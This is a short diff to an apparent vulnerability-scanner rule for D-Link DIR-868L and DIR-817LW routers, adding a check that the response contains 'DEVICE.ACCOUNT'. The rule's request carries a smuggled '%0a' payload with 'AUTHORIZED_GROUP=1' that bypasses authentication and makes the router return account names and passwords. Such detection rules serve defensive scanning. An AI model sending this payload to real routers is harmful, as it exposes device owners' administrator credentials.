@@ -8,7 +8,7 @@ rules:
       SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a
     follow_redirects: false
     expression: >
-      status == 200 && body.bcontains(b'</name>') && body.bcontains(b'</password>')
+      status == 200 && body.bcontains(b'</name>') && body.bcontains(b'</password>') && body.bcontains(b'DEVICE.ACCOUNT')
 detail:
   author: Huasir(https://github.com/dahua966/)
   Affected Version: "DIR-868L DIR-817LW"
